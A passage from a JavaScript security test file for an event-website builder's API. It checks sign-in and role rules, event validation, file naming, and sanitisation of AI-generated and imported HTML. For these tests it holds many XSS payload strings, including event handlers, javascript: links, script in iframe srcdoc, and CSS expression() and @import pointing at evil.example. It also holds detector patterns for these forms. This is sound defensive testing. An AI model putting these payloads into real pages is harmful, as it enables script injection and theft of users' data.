/* node functions/lib/security-fixes.test.js — the security blockers of the 13 Nov 2026 launch check, through the real
   router (lib/api.js handleApi), an in-memory Firestore and Storage, and the model scripted (no AI call is made,
   nothing is paid for). Production is never touched: the database here is a stand-in, the tokens are made up.
     BE-018  the AI, generation, draft and generated/imported routes check the caller: signed in, the role (a Viewer
             reads, never starts a step), the caller's portals; the Bearer header or the sign-in cookie
     BE-020  generate-content writes only the event's own design, reads another event only for a future edition
     BE-021  the AI steps work only on an event that exists: never make a shell, never pay for one
     BE-022  extract-brief writes only name/start/end/venue/city, checked; the file under a server-chosen name,
             stored only after a usable model answer; a "PDF" that is not one is refused
     BE-025  a model's section is made safe when it is written (redesign-section) and when it is served
             (generated-section), keeping everything the site's own scripts read
     BE-050  an imported page is made safe when it is imported and when it is served, as JSON, never text/html */
'use strict';
var passed = 0, failed = 0;
function check(name, ok, detail) { if (ok) { passed++; return; } failed++; console.error('FAIL ' + name + (detail !== undefined ? ' — ' + String(typeof detail === 'string' ? detail : JSON.stringify(detail)).slice(0, 600) : '')); }
function clone(v) { return v == null ? v : JSON.parse(JSON.stringify(v)); }

/* ---------- an in-memory Firestore and Storage ---------- */
function fakeFb() {
  var docs = {}, files = {}, seq = 0;
  function isPlain(v) { return !!v && typeof v === 'object' && !Array.isArray(v); }
  function write(target, data, merge) {
    Object.keys(data).forEach(function (k) {
      var v = data[k];
      if (merge && isPlain(v)) { if (!isPlain(target[k])) target[k] = {}; write(target[k], v, true); }
      else target[k] = clone(v);
    });
  }
  function snap(p) { var d = docs[p]; return { id: p.split('/').pop(), exists: !!d, ref: docRef(p), data: function () { return d ? clone(d) : undefined; } }; }
  function docRef(p) {
    return { id: p.split('/').pop(), path: p,
      collection: function (n) { return colRef(p + '/' + n); },
      get: function () { return Promise.resolve(snap(p)); },
      set: function (data, o) { var merge = !!(o && o.merge); if (!merge || !docs[p]) docs[p] = merge && docs[p] ? docs[p] : {}; write(docs[p], data, merge); return Promise.resolve(); },
      update: function (data) { if (!docs[p]) return Promise.reject(new Error('NOT_FOUND')); write(docs[p], data, false); return Promise.resolve(); } };
  }
  function colRef(p, order, lim) {
    return { path: p,
      doc: function (id) { return docRef(p + '/' + (id || ('auto' + String(++seq).padStart(16, '0')))); },
      add: function (data) { var r = docRef(p + '/auto' + String(++seq).padStart(16, '0')); docs[r.path] = clone(data); return Promise.resolve(r); },
      orderBy: function (f, dir) { return colRef(p, { f: f, desc: dir === 'desc' }, lim); },
      limit: function (n) { return colRef(p, order, n); },
      where: function () { return colRef(p, order, lim); },
      select: function () { return colRef(p, order, lim); },
      get: function () {
        var list = Object.keys(docs).filter(function (k) { return k.indexOf(p + '/') === 0 && k.slice(p.length + 1).indexOf('/') === -1; }).map(snap);
        if (order) list = list.filter(function (s) { return s.data()[order.f] !== undefined; }).sort(function (a, b) { var x = a.data()[order.f], y = b.data()[order.f]; return (x < y ? -1 : x > y ? 1 : 0) * (order.desc ? -1 : 1); });
        if (lim) list = list.slice(0, lim);
        return Promise.resolve({ docs: list, size: list.length, empty: !list.length });
      } };
  }
  function runTransaction(fn) {
    var writes = [];
    var tx = {
      get: function (ref) { return ref.get(); },
      set: function (ref, data, o) { writes.push(function () { return ref.set(data, o); }); return tx; },
      update: function (ref, data) { writes.push(function () { return ref.update(data); }); return tx; }
    };
    return Promise.resolve(fn(tx)).then(function (out) { return writes.reduce(function (pr, w) { return pr.then(w); }, Promise.resolve()).then(function () { return out; }); });
  }
  var bucket = { name: 'test-bucket',
    file: function (path) {
      return {
        save: function (buf) { files[path] = Buffer.isBuffer(buf) ? buf : Buffer.from(String(buf)); return Promise.resolve(); },
        makePublic: function () { return Promise.resolve(); },
        download: function () { return files[path] ? Promise.resolve([files[path]]) : Promise.reject(new Error('No such object: ' + path)); },
        delete: function () { delete files[path]; return Promise.resolve(); }
      };
    } };
  return { db: { collection: function (n) { return colRef(n); }, runTransaction: runTransaction }, bucket: bucket, docs: docs, files: files,
    auth: { verifyIdToken: function (t) {
      if (t === 'expired') return Promise.reject(new Error('expired'));
      return Promise.resolve({ email: t + '@timesinternet.in', uid: 'u-' + t, email_verified: true, firebase: { sign_in_provider: 'google.com' } });
    } } };
}
var FB = fakeFb();
require.cache[require.resolve('./firebase')] = { id: require.resolve('./firebase'), filename: require.resolve('./firebase'), loaded: true, exports: { getFirebase: function () { return FB; } } };
process.env.ALLOWED_EMAIL_DOMAIN = 'timesinternet.in';
process.env.ACCESS_CONFIG_DOC = 'config/test-security-access';

/* ---------- the model, scripted per route; every call kept ---------- */
var llm = require('./llm');
var calls = [], scripted = {};
llm.callJson = function (prompt, schema, opts) {
  var route = (opts && opts.route) || '';
  calls.push(route);
  var next = (scripted[route] || []).shift();
  if (!next) return Promise.resolve({ error: 'No answer scripted for ' + route + '.', code: 'ai-unavailable', status: 502 });
  if (next.fail) return Promise.resolve(Object.assign({ error: 'The AI service could not take this request.' }, next.fail));
  return Promise.resolve({ parsed: next, provider: 'claude', model: 'claude-stub' });
};

var api = require('./api');
var H = api._testHooks;
var sanitize = require('./sanitize');

/* ---------- one request through the real router ---------- */
function call(method, url, body, opts) {
  opts = opts || {};
  return new Promise(function (resolve) {
    var headers = { host: 'localhost', 'content-type': 'application/json' };
    if (opts.cookie) headers.cookie = '__session=' + opts.cookie;
    else if (opts.who !== null) headers.authorization = 'Bearer ' + (opts.who || 'asha');
    var req = { method: method, url: url, headers: headers, socket: {}, rawBody: Buffer.from(body === undefined ? '' : JSON.stringify(body)) };
    req.on = function () { return req; }; req.resume = function () {};
    var res = { statusCode: 200, headers: {}, headersSent: false,
      setHeader: function (k, v) { res.headers[k.toLowerCase()] = v; }, getHeader: function (k) { return res.headers[k.toLowerCase()]; },
      writeHead: function (s, h) { res.statusCode = s; Object.keys(h || {}).forEach(function (k) { res.headers[k.toLowerCase()] = h[k]; }); res.headersSent = true; return res; },
      write: function () { return true; },
      end: function (b) { var t = b === undefined ? '' : String(b), j = null; try { j = JSON.parse(t); } catch (e) { /* not JSON */ } resolve({ status: res.statusCode, body: j, text: t, type: res.headers['content-type'] || '' }); } };
    api.handleApi(req, res);
  });
}

/* ---------- what must never come out of a safety step, read back with a parser (as a browser reads it) ----------
   Markup: no element that runs or frames anything (a YouTube/Vimeo/Maps embed only, sandboxed, in an import), no
   handler, no runnable address, no animation that writes an address. CSS (each <style>'s text, and a stylesheet):
   no "<" that could start a tag, no expression(), no url(javascript:), no behavior/-moz-binding, no @import. Words
   such as "onerror=alert(3)" left as text inside a CSS string are inert and are not counted. */
var parseDocument = require('htmlparser2').parseDocument;
var EMBED_OK = /^https:\/\/(?:www\.youtube\.com\/embed\/|www\.youtube-nocookie\.com\/embed\/|player\.vimeo\.com\/video\/|www\.google\.com\/maps\/embed)/;
function cssUnsafe(css) {
  var found = [];
  [[/<[A-Za-z\/!?]/, 'a "<" that starts a tag'], [/expression\s*\(/i, 'expression()'], [/url\(\s*["']?\s*(?:javascript|vbscript)\s*:/i, 'url(javascript:)'],
    [/behavior\s*:|-moz-binding/i, 'behavior/-moz-binding'], [/@import/i, '@import']].forEach(function (p) { if (p[0].test(css)) found.push('css: ' + p[1]); });
  return found;
}
function unsafeIn(text) {
  var found = [];
  sanitize.styleBlocks(text).forEach(function (b) { found = found.concat(cssUnsafe(b.css)); });
  (function walk(node) {
    (node.children || []).forEach(function (el) {
      if (el.type === 'tag' || el.type === 'script' || el.type === 'style') {
        var tag = el.name.toLowerCase(), a = el.attribs || {};
        if (/^(script|object|embed|form|meta|base|link|frame|frameset|foreignobject|math|applet)$/.test(tag)) found.push('<' + tag + '>');
        if (tag === 'iframe' && !(EMBED_OK.test(a.src || '') && /allow-scripts/.test(a.sandbox || ''))) found.push('<iframe src=' + a.src + '>');
        if (/^(animate|set|animatetransform|animatemotion)$/.test(tag) && /href|^on/i.test(a.attributename || '')) found.push('<' + tag + '> writing ' + a.attributename);
        Object.keys(a).forEach(function (name) {
          var v = String(a[name]).replace(/[\x00-\x20]/g, '').toLowerCase();
          if (/^on/i.test(name) || name === 'srcdoc' || name === 'action' || name === 'formaction') found.push(tag + '[' + name + ']');
          if (/^(javascript|vbscript|livescript):/.test(v)) found.push(tag + '[' + name + '=' + v.slice(0, 30) + ']');
          if (/^data:/.test(v) && !/^data:image\/(png|jpeg|gif|webp|avif);base64,/.test(v)) found.push(tag + '[' + name + '=data:…]');
          if (name === 'style') found = found.concat(cssUnsafe(a[name]));
        });
      }
      if (el.type !== 'style') walk(el);
    });
  })(parseDocument(String(text || '')));
  return found;
}

/* ---------- the data ---------- */
var NOW = '2026-11-01T10:00:00.000Z';
var DESIGN = { themeColor: '#123456', accentColor: '#c0ffee', headingFont: 'Inter', bodyFont: 'Inter', mode: 'light', cornerRadius: 8 };
/* a stored section: what the site's own scripts read, and everything an attacker could hide in it */
var LEGIT = '<section class="ov" data-rv-section="overview"><h2 data-rv-bind="event.name">Overview</h2>' +
  '<div class="cards"><template data-rv-profile data-rv-profile-for="s1"><div class="p" data-rv-profile-name>Asha</div></template>' +
  '<article class="card" data-rv-repeat-template="speakers" data-rv-item><img data-rv-field="photo" src="https://storage.googleapis.com/test-bucket/events/ev-a/p.png" alt="" loading="lazy"></article></div>' +
  '<button type="button" data-rv-tab="previous-agenda:0" aria-selected="true">Day 1</button><div data-rv-tabpanel="previous-agenda:0">Keynote</div>' +
  '<a class="btn" href="#hero" data-rv-award-cta data-nominate-form="nomination" data-interest-form="express-interest">Nominate</a>' +
  '<div class="logo" data-rv-logo-note="The year in your logo was changed: check it."></div>' +
  '<svg class="i" viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h14" stroke="currentColor"/></svg>' +
  '<div class="bg" style="background-image:url(https://storage.googleapis.com/test-bucket/events/ev-a/bg.jpg);color:#fff">Text</div></section>';
var HOSTILE = '<img src=x onerror=alert(1)><img src="y" onerror="alert(2)"><svg/onload=alert(3)><a href=javascript:alert(4)>a</a>' +
  '<a href="jav&#x09;ascript:alert(5)">b</a><a href="data:text/html,<script>alert(6)</script>">c</a><script>alert(7)</script>' +
  '<scr<script>x</script>ipt>alert(8)</script><iframe srcdoc="<script>alert(9)</script>"></iframe><object data="javascript:alert(10)"></object>' +
  '<embed src="javascript:alert(11)"><svg><a><animate attributeName=href values=javascript:alert(12) /><text>x</text></a></svg>' +
  '<form action="//evil.example"><input name="t"></form><meta http-equiv=refresh content="0;url=//evil.example"><div data-href="javascript:alert(13)">d</div>' +
  '<style>.z{background:url(javascript:alert(14))}</style>';
var HOSTILE_CSS = '.ov{color:red;width:expression(alert(1));background:url("javascript:alert(2)")} .q{behavior:url(x.htc);-moz-binding:url(x.xml#y)} ' +
  '.r{content:"</style><img src=x onerror=alert(3)>"} @import url(//evil.example/x.css);';

function seed() {
  FB.docs['config/test-security-access'] = { defaultRole: 'editor', members: {
    'vic@timesinternet.in': { role: 'viewer', portals: ['all'] },
    'pat@timesinternet.in': { role: 'editor', portals: ['hr'] } } };
  FB.docs['events/ev-a'] = { name: 'Event A', createdAt: NOW, createdBy: 'asha@timesinternet.in', portal: 'cio', published: false, start: '2027-01-10', end: '2027-01-11', venue: 'Hall', city: 'Delhi',
    designPlan: { design: DESIGN, sections: [{ id: 'overview', kind: 'about', name: 'Overview' }] },
    generatedSections: [{ id: 'overview', kind: 'about', html: LEGIT.replace('</section>', HOSTILE + '</section>'), css: '.ov{padding:2rem}' + HOSTILE_CSS }] };
  FB.docs['events/ev-b'] = { name: 'Event B', createdAt: NOW, portal: 'cio', designPlan: { design: DESIGN, sections: [{ id: 'overview', kind: 'about' }] } };
  FB.docs['events/ev-shell'] = { name: 'Shell', designPlan: { design: DESIGN, sections: [] } };      // no createdAt: not an event
  FB.docs['events/ev-gone'] = { name: 'Gone', createdAt: NOW, deletedAt: NOW };
}
seed();

var BRIEF_ANSWER = { theme: 'AI at work', audience: 'CIOs', tone: 'calm', tracks: ['Data'], speakerHints: [], sponsorHints: [], keyMessages: ['One'], inferredCategory: 'technology',
  ownerPoints: {}, visualIdentity: { designed: 'no' }, deckSections: [] };
function b64(s) { return Buffer.from(s, 'utf8').toString('base64'); }

var steps = [];
function step(fn) { steps.push(fn); }

/* ================= BE-018: the caller is checked ================= */
step(function () {
  var routes = Object.keys(H.CALLER_CHECKED).sort();
  check('BE-018: the eleven routes that leaned on the gate alone are checked', JSON.stringify(routes) === JSON.stringify([
    'GET /api/draft', 'GET /api/generated-section', 'GET /api/generated-template', 'GET /api/imported-section', 'GET /api/imported-template',
    'POST /api/extract-brief', 'POST /api/generate-content', 'POST /api/ingest-source', 'POST /api/plan-structure', 'POST /api/redesign-section', 'POST /api/suggest-design']), routes);
  return Promise.all([
    call('GET', '/api/generated-section?eventId=ev-a&id=overview', undefined, { who: null }),
    call('POST', '/api/extract-brief', { eventId: 'ev-a', fileName: 'b.txt', mimeType: 'text/plain', docBase64: b64('x') }, { who: null }),
    call('POST', '/api/suggest-design', { eventId: 'ev-a' }, { who: null }),
    call('GET', '/api/generated-section?eventId=ev-a&id=overview', undefined, { who: 'expired' })
  ]).then(function (r) {
    check('BE-018: no sign-in: 401 on a read and on a paid step', r[0].status === 401 && r[1].status === 401 && r[2].status === 401, r.map(function (x) { return x.status; }));
    check('BE-018: an expired sign-in: 401', r[3].status === 401, r[3]);
    check('BE-018: nothing was asked of the model', calls.length === 0, calls);
  });
});
step(function () {
  return Promise.all([
    call('POST', '/api/generate-content', { eventId: 'ev-a', templateId: 'gen-ev-a' }, { who: 'vic' }),
    call('POST', '/api/plan-structure', { eventId: 'ev-a' }, { who: 'vic' }),
    call('POST', '/api/redesign-section', { eventId: 'ev-a', sectionId: 'overview', html: '<section>x</section>' }, { who: 'vic' }),
    call('GET', '/api/generated-section?eventId=ev-a&id=overview', undefined, { who: 'vic' })
  ]).then(function (r) {
    check('BE-018: a Viewer cannot start a paid step (403 view-only)', [0, 1, 2].every(function (i) { return r[i].status === 403 && r[i].body && r[i].body.code === 'view-only'; }), r.slice(0, 3).map(function (x) { return [x.status, x.body]; }));
    check('BE-018: a Viewer still reads the site (generated-section 200)', r[3].status === 200, r[3].status);
    check('BE-018: still nothing asked of the model', calls.length === 0, calls);
  });
});
step(function () {
  return Promise.all([
    call('GET', '/api/generated-section?eventId=ev-a&id=overview', undefined, { who: 'pat' }),
    call('POST', '/api/generate-content', { eventId: 'ev-a', templateId: 'gen-ev-a' }, { who: 'pat' }),
    call('GET', '/api/draft?eventId=ev-a', undefined, { who: 'pat' })
  ]).then(function (r) {
    check('BE-018: someone who works in another portal is refused (403 not-your-portal)', r.every(function (x) { return x.status === 403 && x.body && x.body.code === 'not-your-portal'; }), r.map(function (x) { return [x.status, x.body && x.body.code]; }));
    return call('GET', '/api/generated-section?eventId=ev-a&id=overview', undefined, { cookie: 'asha' });
  }).then(function (r) {
    check('BE-018: the sign-in cookie alone is accepted (Create Event calls the steps with it)', r.status === 200, r.status);
  });
});

/* ================= BE-025: a model's section, served ================= */
step(function () {
  return call('GET', '/api/generated-section?eventId=ev-a&id=overview').then(function (r) {
    var html = (r.body && r.body.html) || '', css = (r.body && r.body.css) || '';
    check('BE-025: generated-section answers', r.status === 200 && html.length > 200, r.status);
    check('BE-025: nothing unsafe is served from a stored section', !unsafeIn(html).length && !cssUnsafe(css).length, unsafeIn(html).concat(cssUnsafe(css)).join(', ') + ' :: ' + html + ' :: ' + css);
    check('BE-025: no <style> is left in the markup; a stylesheet can never close its element', !/<style/i.test(html) && !/<\/|<!--|<img/i.test(css), css);
    ['data-rv-section="overview"', 'data-rv-bind="event.name"', '<template data-rv-profile data-rv-profile-for="s1">', 'data-rv-profile-name', 'data-rv-repeat-template="speakers"',
      'data-rv-field="photo"', 'src="https://storage.googleapis.com/test-bucket/events/ev-a/p.png"', 'data-rv-tab="previous-agenda:0"', 'data-rv-tabpanel="previous-agenda:0"',
      'data-rv-award-cta', 'data-nominate-form="nomination"', 'data-interest-form="express-interest"', 'data-rv-logo-note="The year in your logo was changed: check it."',
      '<path d="M5 12h14" stroke="currentColor">', 'background-image:url(https://storage.googleapis.com/test-bucket/events/ev-a/bg.jpg)'].forEach(function (needle) {
      check('BE-025: what the site\'s own scripts read stays — ' + needle, html.indexOf(needle) !== -1, html);
    });
    check('BE-025: the section\'s own CSS stays (scoped), the unsafe declarations do not', /padding:\s*2rem/.test(css) && /color:\s*red/.test(css) && !/@import/.test(css), css);
  });
});

/* ================= BE-025: a section the AI reworks (also the chat's rework and new-section steps) ================= */
step(function () {
  var PIC = 'https://storage.googleapis.com/test-bucket/events/ev-a/hall.png';
  scripted['redesign-section'] = [{ summary: 'New look', html: '<section class="ov" onclick="steal()"><img src="rvimg://p1" alt="Hall" onerror=alert(1)><h2 data-rv-bind="event.name">Title</h2>' + HOSTILE + '</section>',
    css: '.ov{background:url(rvimg://p1) center/cover;color:red}' + HOSTILE_CSS }];
  return call('POST', '/api/redesign-section', { eventId: 'ev-a', sectionId: 'overview', mode: 'edit', instruction: 'make it bolder', html: '<section class="ov"><img src="' + PIC + '" alt=""><h2>Old</h2></section>', css: '.ov{padding:1rem}' }).then(function (r) {
    var html = (r.body && r.body.html) || '', css = (r.body && r.body.css) || '';
    check('BE-025: redesign-section answers', r.status === 200 && /^<section/.test(html), [r.status, r.body]);
    check('BE-025: nothing unsafe the model wrote reaches the page', !unsafeIn(html).length && !cssUnsafe(css).length, unsafeIn(html).concat(cssUnsafe(css)).join(', ') + ' :: ' + html + ' :: ' + css);
    check('BE-025: the section\'s picture is its real address again (made safe after the tokens are put back)', html.indexOf('src="' + PIC + '"') !== -1 && css.indexOf(PIC) !== -1, html + ' :: ' + css);
    check('BE-025: the section\'s own words and bindings stay', html.indexOf('data-rv-bind="event.name"') !== -1 && /Title/.test(html) && /color:\s*red/.test(css), html);
  });
});
step(function () {
  scripted['redesign-section'] = [{ summary: 'x', html: '<script>alert(1)</script>', css: '' }];
  return call('POST', '/api/redesign-section', { eventId: 'ev-a', sectionId: 'overview', html: '<section><h2>Old</h2></section>', css: '' }).then(function (r) {
    check('BE-025: an answer that is nothing once made safe is refused as unusable (502), nothing changes', r.status === 502 && r.body && r.body.code === 'ai-unusable', [r.status, r.body]);
  });
});
step(function () {
  /* the generation writes its sections through the same step, last, after their pictures are addresses again */
  var src = require('fs').readFileSync(require('path').join(__dirname, 'api.js'), 'utf8');
  /* stored in the run's own documents since BE-032 (generated-site.js writeSections) */
  var at = src.indexOf('genDesign.motionBudget(sections);'), safeAt = src.indexOf('var safe = safeGeneratedSection(s.html, s.css);', at), mergeAt = src.indexOf('generatedSite.writeSections(fb, eventId, commitRunId, sections', at);
  check('BE-025: generate-content makes every section safe after it is assembled and before it is stored', at !== -1 && safeAt > at && mergeAt > safeAt, [at, safeAt, mergeAt]);
  check('BE-025: the old regex strippers are gone; the model\'s text is only tidied before its pictures are put back', !/out\.replace\(\/\\son\[a-z\]\+/.test(src) && /var html = tidyGeneratedSectionHtml\(String\(found\.html \|\| ''\)\);/.test(src), '');
  var s = H.safeGeneratedSection(HOSTILE, HOSTILE_CSS);
  check('BE-025: safeGeneratedSection removes every hostile form listed in the audit', !unsafeIn(s.html).length && !cssUnsafe(s.css).length, unsafeIn(s.html).concat(cssUnsafe(s.css)).join(', ') + ' :: ' + JSON.stringify(s));
  check('BE-025: …and the detector itself sees the hostile input as hostile', unsafeIn(HOSTILE).length >= 10 && cssUnsafe(HOSTILE_CSS).length >= 3, unsafeIn(HOSTILE).length);
});

/* ================= BE-020: generate-content writes only its own event ================= */
step(function () {
  var before = JSON.stringify(FB.docs['events/ev-a']), n = calls.length;
  return Promise.all([
    call('POST', '/api/generate-content', { eventId: 'ev-a', templateId: 'gen-ev-b' }),
    call('POST', '/api/generate-content', { eventId: 'ev-a', templateId: 'gen-ev-a', sourceEventId: 'ev-b' }),
    call('POST', '/api/generate-content', { eventId: 'ev-a', templateId: 'no-such-template' }),
    call('POST', '/api/generate-content', { eventId: 'ev-a', templateId: 'gen-ev-a', sourceEventId: 'ev-nobody', futureEdition: true })
  ]).then(function (r) {
    check('BE-020: another event\'s design is refused (400 other-event)', r[0].status === 400 && r[0].body.code === 'other-event', r[0]);
    check('BE-020: another event\'s brief is refused unless it is a future edition (400 other-event)', r[1].status === 400 && r[1].body.code === 'other-event', r[1]);
    check('BE-020: an unknown template is a fixed sentence, no server path', r[2].status === 400 && r[2].body.code === 'unknown-template' && !/\/|ENOENT|template\.json/.test(r[2].body.error), r[2].body);
    check('BE-020: a future edition read from an event that does not exist: 404', r[3].status === 404, [r[3].status, r[3].body]);
    check('BE-020: nothing written, nothing asked of the model', JSON.stringify(FB.docs['events/ev-a']) === before && calls.length === n, calls.slice(n));
  });
});

/* ================= BE-021: only an event that exists ================= */
step(function () {
  var n = calls.length;
  return Promise.all([
    call('POST', '/api/extract-brief', { eventId: 'ev-nobody', fileName: 'b.txt', mimeType: 'text/plain', docBase64: b64('Tagline / theme: x'), eventMeta: { name: 'Made up' } }),
    call('POST', '/api/plan-structure', { eventId: 'ev-shell' }),
    call('POST', '/api/redesign-section', { eventId: 'ev-gone', sectionId: 'overview', html: '<section>x</section>' }),
    call('POST', '/api/ingest-source', { eventId: 'ev-nobody', url: 'https://example.com/', type: 'competitor' })
  ]).then(function (r) {
    check('BE-021: a step on an event never made, a shell or a deleted event: 404', r.every(function (x) { return x.status === 404; }), r.map(function (x) { return [x.status, x.body && x.body.code]; }));
    check('BE-021: no shell was made for the unknown id', !FB.docs['events/ev-nobody'] && !Object.keys(FB.docs).some(function (k) { return k.indexOf('events/ev-nobody/') === 0; }), Object.keys(FB.docs));
    check('BE-021: the shell was not named or changed', FB.docs['events/ev-shell'].name === 'Shell' && !FB.docs['events/ev-shell'].createdAt);
    check('BE-021: nothing asked of the model', calls.length === n, calls.slice(n));
  });
});
step(function () {
  return H.watchEvent(FB, 'ev-a').then(function (w) {
    check('BE-021: watchEvent offers update() for a live event', typeof w.update === 'function' && w.live === true);
    return H.watchEvent(FB, 'ev-shell').then(function () { return 'resolved'; }, function (err) { return err && err.status; });
  }).then(function (got) { check('BE-021: …and refuses a shell with 404', got === 404, got); });
});

/* ================= BE-022: extract-brief ================= */
step(function () {
  var n = calls.length, before = clone(FB.docs['events/ev-a']);
  scripted['extract-brief'] = [clone(BRIEF_ANSWER)];
  return call('POST', '/api/extract-brief', { eventId: 'ev-a', fileName: '../../../events/ev-b/published/index.html', mimeType: 'text/plain', docBase64: b64('Tagline / theme: AI at work'),
    eventMeta: { name: '  Event A 2027 ', city: 'Pune', start: '2027-02-01', end: '2027-02-02', description: 'Tagline / theme: AI at work',
      deletedAt: NOW, published: true, portal: 'hr', createdBy: 'mallory@timesinternet.in', designPlan: {}, generatedSections: [], settings: { seo: {} }, counters: { leads: 99 } } }).then(function (r) {
    var ev = FB.docs['events/ev-a'];
    check('BE-022: the brief is read', r.status === 200 && r.body.briefId && r.body.extracted && r.body.extracted.theme === 'AI at work', [r.status, r.body]);
    check('BE-022: the five facts are written, checked and trimmed', ev.name === 'Event A 2027' && ev.city === 'Pune' && ev.start === '2027-02-01' && ev.end === '2027-02-02', ev);
    check('BE-022: nothing else the request carried reaches the event', !ev.deletedAt && ev.published === false && ev.portal === 'cio' && ev.createdBy === before.createdBy &&
      JSON.stringify(ev.designPlan) === JSON.stringify(before.designPlan) && JSON.stringify(ev.generatedSections) === JSON.stringify(before.generatedSections) && !ev.settings && !ev.counters && !ev.description, ev);
    var brief = FB.docs['events/ev-a/briefs/' + r.body.briefId] || {};
    var stored = Object.keys(FB.files).filter(function (k) { return k.indexOf('events/ev-a/briefs/') === 0; });
    check('BE-022: the file is stored under the name the server chose (the brief\'s id)', stored.length === 1 && stored[0] === 'events/ev-a/briefs/' + r.body.briefId + '.txt' && brief.storagePath === stored[0], [stored, brief.storagePath]);
    check('BE-022: no file anywhere outside the event\'s briefs', !Object.keys(FB.files).some(function (k) { return /published|\.\./.test(k); }), Object.keys(FB.files));
    check('BE-022: the name it came with is only shown', brief.sourceFileName === '../../../events/ev-b/published/index.html', brief.sourceFileName);
    check('BE-022: one model call', calls.length === n + 1);
  });
});
step(function () {
  var n = calls.length, files = Object.keys(FB.files).length, briefs = Object.keys(FB.docs).filter(function (k) { return k.indexOf('events/ev-a/briefs/') === 0; }).length;
  scripted['extract-brief'] = [{ fail: { code: 'ai-unavailable', status: 503 } }];
  return Promise.all([
    call('POST', '/api/extract-brief', { eventId: 'ev-a', fileName: 'b.txt', mimeType: 'text/plain', docBase64: b64('x'), eventMeta: { start: 'not a date' } }),
    call('POST', '/api/extract-brief', { eventId: 'ev-a', fileName: 'b.pdf', mimeType: 'application/pdf', docBase64: b64('<html>not a pdf</html>') }),
    call('POST', '/api/extract-brief', { eventId: 'ev-a', fileName: 'b.txt', mimeType: 'text/plain', docBase64: b64('x'), eventMeta: { name: 'x', start: '2027-02-02', end: '2027-02-01' } })
  ]).then(function (r) {
    check('BE-022: a fact that does not pass is refused before anything is paid for (400)', r[0].status === 400 && r[0].body.field === 'start', r[0].body);
    check('BE-022: a "PDF" that is not one: 415', r[1].status === 415 && r[1].body.code === 'unsupported-file', r[1]);
    check('BE-022: an end before the start: 400', r[2].status === 400 && r[2].body.field === 'end', r[2].body);
    check('BE-022: none of them asked the model', calls.length === n, calls.slice(n));
    return call('POST', '/api/extract-brief', { eventId: 'ev-a', fileName: 'b.txt', mimeType: 'text/plain', docBase64: b64('x'), eventMeta: {} });
  }).then(function (r) {
    check('BE-022: a model failure is answered as such', r.status === 503, [r.status, r.body]);
    check('BE-022: and nothing is stored for it — no file, no brief', Object.keys(FB.files).length === files &&
      Object.keys(FB.docs).filter(function (k) { return k.indexOf('events/ev-a/briefs/') === 0; }).length === briefs, Object.keys(FB.files));
  });
});

/* ================= BE-050: an imported page ================= */
var IMPORT_CSS = '.hero{color:#111;background:url(https://cdn.example.com/a.png)} .bad{width:expression(alert(1));background:url(javascript:alert(2))} @import url(//evil.example/x.css); ' +
  '.r{content:"</style><img src=x onerror=alert(3)>"} @font-face{font-family:X;src:url(data:font/woff2;base64,AAAA)} @media (400px < width < 900px){.hero{padding:1rem}}';
var IMPORT_BODY = '<div id="root"><div class="app min-h-screen"><header class="top"><nav><a href="#about">About</a></nav></header>' +
  '<section id="about" class="py-20" data-rv-motion="{&quot;on&quot;:&quot;view&quot;,&quot;a&quot;:[{&quot;k&quot;:[{&quot;opacity&quot;:0},{&quot;opacity&quot;:1}]}]}"><h2>About the summit</h2>' +
  '<img src="https://cdn.example.com/p.png" alt="Stage" onerror="alert(4)"><a href=javascript:alert(5)>x</a><iframe srcdoc="<script>alert(6)</script>"></iframe></section>' +
  '<section id="speakers" data-state="open"><h2>Speakers</h2><svg viewBox="0 0 10 10"><style>.s{fill:red;content:"<img src=x onerror=alert(7)>"}</style><circle r="4"/></svg>' +
  '<script>alert(8)</script><form action="//evil.example"><input type="email" name="e" required placeholder="Email"><button type="submit">Join</button></form></section>' +
  '<footer class="foot"><p>© Summit</p><iframe src="https://www.youtube.com/embed/abc"></iframe></footer></div></div>';
step(function () {
  var page = '<html><head><link rel="stylesheet" href="/a.css"></head><body>' + IMPORT_BODY + '</body></html>';
  return H.processLovableImport(FB, 'imp-sec', page, function () { return Promise.resolve(IMPORT_CSS); }, function () { return Promise.resolve(null); }, null, { sourceUrl: 'https://example.lovable.app/' }).then(function (r) {
    var section = String(FB.files['events/import-imp-sec/section.html'] || ''), full = String(FB.files['events/import-imp-sec/index.html'] || '');
    var cut = JSON.parse(String(FB.files['events/import-imp-sec/sections.json'] || '{}'));
    var pieces = [section, full.replace('<meta charset="utf-8">', ''), (cut.frameOpen || '') + (cut.frameClose || '')].concat((cut.sections || []).map(function (x) { return x.html; }));
    var all = pieces.join('\n');
    check('BE-050: the import is stored', r.templateId === 'imported-imp-sec' && section.length > 200 && full.length > 200, r);
    check('BE-050: nothing unsafe is stored — the page, the debug copy, the cut sections', pieces.every(function (x) { return !unsafeIn(x).length; }) && (cut.sections || []).length >= 2, pieces.map(unsafeIn).join(' | '));
    check('BE-050: what the safety step took out is reported and kept', Array.isArray(r.removed) && r.removed.some(function (x) { return x.what === 'event handler attribute'; }) &&
      Array.isArray(FB.docs['events/import-imp-sec'].importRemoved), r.removed);
    check('BE-050: the page\'s motion, its own data-* and its stylesheet\'s marks stay', section.indexOf('data-rv-motion="{&quot;on&quot;:&quot;view&quot;') !== -1 && section.indexOf('data-state="open"') !== -1 &&
      /<style data-rv-imported-css="\/a\.css">/.test(section) && /\.hero\{color:#111/.test(section) && /@font-face/.test(section) && /@media \(400px < width < 900px\)/.test(section), section.slice(0, 600));
    check('BE-050: a <style> inside the page is kept as a stylesheet of its own, never where it was (in an <svg>)', /<style data-rv-imported-css="page">[\s\S]*\.s\{fill:red/.test(section) && !/<svg[^>]*>\s*<style/i.test(section), section);
    check('BE-050: a known video stays, sandboxed; the page\'s form is a plain block', /<iframe src="https:\/\/www\.youtube\.com\/embed\/abc"[^>]*sandbox=/.test(section) && /data-rv-was-form/.test(section), section);
  });
});
step(function () {
  /* an import stored before the safety step, unsafe in Storage: served safe anyway */
  FB.docs['events/import-imp-old'] = { sectionHtmlPath: 'events/import-imp-old/section.html', sectionsPath: 'events/import-imp-old/sections.json', sections: [{ id: 'about', name: 'About' }, { id: 'speakers', name: 'Speakers' }] };
  FB.files['events/import-imp-old/section.html'] = Buffer.from('<style data-rv-imported-css="/a.css">\n' + IMPORT_CSS + '\n</style>\n<div class="rv-imported">\n' + IMPORT_BODY + '\n</div>');
  FB.files['events/import-imp-old/sections.json'] = Buffer.from(JSON.stringify({ v: 2,
